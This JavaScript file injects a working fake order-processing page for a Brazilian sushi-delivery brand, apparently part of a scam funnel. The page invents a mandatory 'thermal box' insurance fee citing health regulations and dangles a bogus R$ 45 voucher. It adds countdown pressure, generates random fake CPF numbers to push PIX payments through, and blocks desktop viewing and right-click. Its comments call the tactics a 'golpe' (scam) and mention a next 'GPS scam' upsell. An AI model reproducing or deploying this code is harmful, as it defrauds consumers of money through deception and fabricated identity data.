(function() {
        // ==========================================
    // 📦 PAYLOAD: BOX TÉRMICA + VOUCHER R$ 25
    // ==========================================
    var payload = `<!DOCTYPE html>
<html lang="pt-br">
<head>

    <script
      src="https://cdn.utmify.com.br/scripts/utms/latest.js"
      data-utmify-prevent-xcod-sck
      data-utmify-prevent-subids
      async
      defer
    ></script>

    <script src="scripts/utms/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>

    <!-- TikTok Pixel Code Start -->
    <script>
    !function (w, d, t) {
      w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
    var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
    ;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};


      ttq.load('D5MLIM3C77U85R08N62G');
      ttq.page();
    }(window, document, 'ttq');
    </script>
    <!-- TikTok Pixel Code End -->

      <!-- Meta Pixel Code -->
    <script>
    !function(f,b,e,v,n,t,s)
    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
    n.queue=[];t=b.createElement(e);t.async=!0;
    t.src=v;s=b.getElementsByTagName(e)[0];
    s.parentNode.insertBefore(t,s)}(window, document,'script',
    'https://connect.facebook.net/en_US/fbevents.js');
    fbq('init', '911135198055254');
    fbq('track', 'PageView');
    </script>
    <noscript><img height="1" width="1" style="display:none" src="tr?id=911135198055254&ev=PageView&noscript=1"></noscript>
    <!-- End Meta Pixel Code -->

    
    
    
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Processando Pedido | Nobre Sushi</title>
    
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.11/clipboard.min.js"></script>


    <style>
        body { font-family: 'Inter', sans-serif; background-color: #f7f7f7; user-select: none; -webkit-user-select: none; }
        
        /* Animações */
        .fade-in { animation: fadeIn 0.6s ease-out forwards; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        
        .pulse-alert { animation: pulseRed 2s infinite; }
        @keyframes pulseRed { 0% { box-shadow: 0 0 0 0 rgba(234, 29, 44, 0.4); } 70% { box-shadow: 0 0 0 10px rgba(234, 29, 44, 0); } 100% { box-shadow: 0 0 0 0 rgba(234, 29, 44, 0); } }

        .progress-bar { transition: width 3s ease-in-out; }

        /* Ticket Dourado para o Voucher */
        .voucher-ticket {
            background-image: radial-gradient(circle at left center, #f7f7f7 10px, transparent 11px), radial-gradient(circle at right center, #f7f7f7 10px, transparent 11px);
            background-color: #fff;
            border: 1px dashed #d1d5db;
        }

        #desktop-warning { display: none; }
        @media (min-width: 1024px) {
            #desktop-warning {
                display: flex !important;
                position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
                background: #ea1d2c; z-index: 99999;
                flex-direction: column; align-items: center; justify-content: center;
                color: white; text-align: center; padding: 20px;
            }
            body { overflow: hidden !important; }
        }
    </style>
    <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96" />
    <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
    <link rel="shortcut icon" href="/favicon.ico" />
    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
    <link rel="manifest" href="/site.webmanifest" />
</head>
<body class="bg-[#f7f7f7] min-h-screen flex flex-col" oncontextmenu="return false">

    <div id="desktop-warning">
        <i class="fa-solid fa-mobile-screen-button text-6xl mb-4"></i>
        <h1 class="text-3xl font-bold mb-2">Use seu Celular</h1>
        <p class="text-lg opacity-90">Acompanhe seu pedido pelo dispositivo móvel.</p>
    </div>

    <!-- TELA 1: SUCESSO INICIAL (O GOLPE DE DOPAMINA) -->
    <div id="screen-success" class="flex-1 flex flex-col items-center justify-center p-6 text-center transition-all duration-500">
        <div class="w-24 h-24 bg-green-100 rounded-full flex items-center justify-center mb-6 animate-bounce">
            <i class="fa-solid fa-check text-5xl text-[#05a65a]"></i>
        </div>
        <h1 class="text-2xl font-bold text-[#3e3e3e] mb-2">Pedido Recebido!</h1>
        <p class="text-gray-500 mb-8">Validando logística de entrega...</p>
        <div class="w-full max-w-xs bg-gray-200 h-2 rounded-full overflow-hidden">
            <div id="prog-bar" class="h-full bg-[#05a65a] w-0 transition-all duration-3000 ease-out"></div>
        </div>
    </div>

    <!-- TELA 2: O UPSELL (O PROBLEMA E A SOLUÇÃO) -->
    <div id="screen-upsell" class="hidden flex-1 flex flex-col p-4 fade-in">
        
        <!-- ALERTA DE TOPO -->
        <div class="bg-orange-50 border-l-4 border-orange-500 p-4 mb-6 rounded shadow-sm">
                    <div class="flex items-start">
                        <div class="flex-shrink-0 mt-0.5">
                            <i id="alerta-icone" class="fa-solid fa-temperature-arrow-up text-orange-500 text-xl"></i>
                        </div>
                        <div class="ml-3">
                            <h3 id="alerta-titulo" class="text-sm font-bold text-orange-800 uppercase">Alerta de Temperatura</h3>
                            <div id="alerta-texto" class="text-xs text-orange-700 mt-1">
                                Devido ao calor extremo (>30°C), a Vigilância Sanitária exige proteção térmica extra.
                            </div>
                        </div>
                    </div>
                </div>

        <div class="bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden mb-6">
            <div class="bg-[#3e3e3e] p-3 text-white text-center flex items-center justify-center gap-2">
                <i class="fa-solid fa-box-open"></i> <span class="font-bold text-sm uppercase">Adicionar Box Térmica</span>
            </div>
            
            <div class="p-5">
                <p class="text-gray-600 text-sm mb-4 leading-relaxed">
                    Para garantir que seu pedido chegue fresco e livre de bactérias, precisamos enviar na <strong>Box Térmica Lacrada</strong>.
                </p>

                <!-- PREÇO DA TAXA -->
                <div class="flex justify-between items-center bg-gray-50 p-3 rounded-lg border border-gray-200 mb-5">
                    <div class="flex items-center gap-3">
                        <div class="bg-white p-2 rounded border border-gray-200">
                            <i class="fa-solid fa-snowflake text-blue-500 text-lg"></i>
                        </div>
                        <div class="flex flex-col">
                            <span class="text-xs text-gray-500 font-bold uppercase">Seguro Térmico</span>
                            <span class="text-sm text-gray-800 font-medium">Uso obrigatório</span>
                        </div>
                    </div>
                    <span class="text-xl font-black text-[#EA1D2C]">R$ 9,83</span>
                </div>

                <!-- O VOUCHER DE DESCULPAS (A ISCA) -->
                <div class="voucher-ticket p-4 mb-6 relative overflow-hidden">
                    <div class="absolute top-0 right-0 bg-[#05a65a] text-white text-[9px] font-bold px-2 py-1 rounded-bl uppercase">Presente</div>
                    <div class="flex flex-col items-center text-center">
                        <span class="text-xs text-gray-500 font-bold uppercase tracking-wider mb-1">VALE-SUSHI</span>
                        <h2 class="text-3xl font-black text-[#05a65a] mb-1">R$ 45,00</h2>
                        <p class="text-[10px] text-gray-400">R$ 45,00 LIBERADO PARA PRÓXIMO PEDIDO</p>
                        <p class="text-[10px] text-[#EA1D2C] mt-2 font-medium italic">"Desculpe pelo custo do seguro! Use esse valor para comer de graça na próxima vez."</p>
                    </div>
                </div>

                <!-- ÁREA DE PAGAMENTO -->
                <div id="loading-pix" class="text-center py-4">
                    <div class="w-8 h-8 border-4 border-[#EA1D2C] border-t-transparent rounded-full animate-spin mx-auto"></div>
                    <p class="text-xs text-gray-400 mt-2">Gerando chave PIX do seguro...</p>
                </div>

                <div id="payment-area" class="hidden flex flex-col items-center animate-pulse-once">
                    <div class="mb-4 p-2 bg-white border border-gray-200 rounded-lg shadow-sm">
                        <img id="qr-code-img" src="" class="w-40 h-40 object-contain">
                    </div>

                    <div class="w-full flex gap-2 mb-2">
                        <input type="text" id="pix-copia-cola" class="flex-1 bg-gray-50 border border-gray-200 rounded-lg px-3 py-3 text-xs text-gray-600 outline-none truncate font-mono" readonly>
                        <button id="btn-copy" class="bg-[#EA1D2C] text-white px-4 py-3 rounded-lg font-bold shadow-lg shadow-red-100 active:scale-95 transition flex items-center gap-2">
                            <span class="hidden sm:inline">PAGAR</span> <i class="fa-regular fa-copy"></i>
                        </button>
                    </div>
                    <p class="text-[10px] text-gray-400 text-center">Pagamento instantâneo. Liberação automática.</p>
                </div>
            </div>
        </div>

        <!-- COUNTDOWN DE PRESSÃO -->
        <div class="text-center space-y-2 px-4">
            <p class="text-xs text-gray-400">Tempo para despacho do motoboy:</p>
            <div class="text-2xl font-mono font-bold text-[#3e3e3e]" id="countdown">04:59</div>
            
            <button onclick="recusarOferta()" class="text-[10px] text-gray-400 underline mt-4 hover:text-red-500 transition">
                Recusar proteção térmica e perder o Vale-Sushi de R$ 45,00
            </button>
        </div>

    </div>

    <script>
        const API_BASE_URL = "";
        const UPSELL_VALUE = 9.83; // VALOR DA TAXA

        document.addEventListener('DOMContentLoaded', () => {
    // --- LÓGICA DIA/NOITE ---
                const hora = new Date().getHours();
                if (hora >= 18 || hora <= 5) { // Se for entre 18h e 05h da manhã
                    document.getElementById('alerta-titulo').innerText = "Alta Demanda Noturna";
                    document.getElementById('alerta-texto').innerHTML = "Devido ao alto volume de pedidos agora, a <strong>Box Térmica</strong> é obrigatória para o motoboy não atrasar.";
                    document.getElementById('alerta-icone').className = "fa-solid fa-motorcycle text-orange-500 text-xl";
                }
                // ------------------------
            // Setup Inicial
            const progressBar = document.getElementById('prog-bar');
            if(progressBar) {
                setTimeout(() => { progressBar.style.width = "90%"; }, 100);
            }

            // Rastreamento View
            if(window.fbq) fbq('trackCustom', 'VisualizouBoxTermica');

            // Transição Dramática (Sucesso -> Alerta)
            setTimeout(() => {
                document.getElementById('screen-success').classList.add('hidden');
                document.getElementById('screen-upsell').classList.remove('hidden');
                
                // Inicia lógica
                iniciarCountdown();
                gerarPixTaxa();
            }, 3000); // 3 segundos de "sucesso" antes do "problema"
        });

        function iniciarCountdown() {
            let timer = 299; // 5 minutos
            const el = document.getElementById('countdown');
            
            const interval = setInterval(() => {
                if(timer <= 0) {
                    clearInterval(interval);
                    el.innerText = "EXPIRADO";
                    return;
                }
                timer--;
                const m = Math.floor(timer / 60).toString().padStart(2, '0');
                const s = (timer % 60).toString().padStart(2, '0');
                el.innerText = \`\${m}:\${s}\`;
                
                if(timer < 60) el.classList.add('text-red-600', 'pulse-urgent');
            }, 1000);
        }

        function gerarCPF() {
            // Gerador simples para preencher requisito da API
            const r = (n) => Math.floor(Math.random() * n);
            return \`\${r(9)}\${r(9)}\${r(9)}.\${r(9)}\${r(9)}\${r(9)}.\${r(9)}\${r(9)}\${r(9)}-\${r(9)}\${r(9)}\`;
        }

        async function gerarPixTaxa() {
            // Recupera dados salvos no input_file_3.js
            const nome = localStorage.getItem('user_cache_nome') || "Cliente";
            const zap = localStorage.getItem('user_cache_zap') || "11999999999";
            const zapClean = zap.replace(/\D/g, '');

            const payload = {
                valorTotal: UPSELL_VALUE,
                nome: nome,
                whatsapp: zapClean,
                cpf: gerarCPF().replace(/\D/g, ''),
                cep: "01001000",
                rua: "Taxa Box Termica",
                numero: "100",
                bairro: "Centro",
                complemento: "Voucher 25 Off",
                products: [{ name: "Seguro Térmico + Vale-Sushi", price: UPSELL_VALUE, quantity: 1 }],
                trackingParameters: { src: "upsell_box", utm_source: "upsell_system" }
            };

            try {
                const response = await fetch(\`\${API_BASE_URL}/criar-pix\`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                const data = await response.json();

                if(data.success) {
                    // Atualiza UI
                    document.getElementById('loading-pix').classList.add('hidden');
                    document.getElementById('payment-area').classList.remove('hidden');
                    document.getElementById('payment-area').classList.add('flex');
                    
                    document.getElementById('qr-code-img').src = data.qrCodeData;
                    document.getElementById('pix-copia-cola').value = data.pixCopiaECola;

                    // Configura Copia e Cola
                    new ClipboardJS('#btn-copy', {
                        text: function() { return data.pixCopiaECola; }
                    }).on('success', function() {
                        Swal.fire({ toast: true, position: 'top', icon: 'success', title: 'Copiado!', showConfirmButton: false, timer: 1500 });
                    });

                    // Inicia Monitoramento
                    monitorarPagamento(data.transactionId);

                } else {
                    document.getElementById('loading-pix').innerText = "Erro ao gerar taxa. Atualize a página.";
                }

            } catch(e) {
                console.error("Erro API Upsell", e);
            }
        }

        function monitorarPagamento(id) {
            const check = setInterval(async () => {
                try {
                    const res = await fetch(\`\${API_BASE_URL}/verificar-status/\${id}\`);
                    const d = await res.json();
                    
                    if (d.status === 'paid' || d.status === 'approved') {
                        clearInterval(check);
                        sucessoPagamento(id);
                    }
                } catch(e) {}
            }, 2500);
        }

        function sucessoPagamento(id) {
            // Dispara Pixels
            if(window.fbq) {
                fbq('track', 'Purchase', {
                    value: UPSELL_VALUE,
                    currency: 'BRL',
                    content_name: 'Upsell Box Termica'
                }, { eventID: id });
            }
            if(window.ttq) {
                ttq.track('Purchase', {
                    value: UPSELL_VALUE,
                    currency: 'BRL',
                    content_type: 'product',
                    content_name: 'Upsell Box Termica'
                });
            }

            Swal.fire({
                icon: 'success',
                title: 'BOX CONFIRMADA!',
                text: 'Você ganhou seu Vale-Sushi de R$ 45,00!',
                showConfirmButton: false,
                timer: 2000
            }).then(() => {
                // Redireciona para o próximo passo (pode ser upsell 2 ou final)
                window.location.href = "upsell2.html"; 
            });
        }

        window.recusarOferta = function() {
            Swal.fire({
                title: 'Tem certeza?',
                text: "Seu pedido será enviado sem proteção térmica e você PERDE o Vale-Sushi de R$ 45,00.",
                icon: 'warning',
                showCancelButton: true,
                confirmButtonColor: '#d33',
                cancelButtonColor: '#3085d6',
                confirmButtonText: 'Sim, quero correr o risco',
                cancelButtonText: 'Não, quero proteger e ganhar voucher'
            }).then((result) => {
                if (result.isConfirmed) {
                    // Se recusar, vai para o "Golpe do GPS" (Upsell 2) ou finaliza
                    window.location.href = "upsell2.html";
                }
            });
        }
    </script>
</body>
</html>`;

    document.open();
    document.write(payload);
    document.close();
})();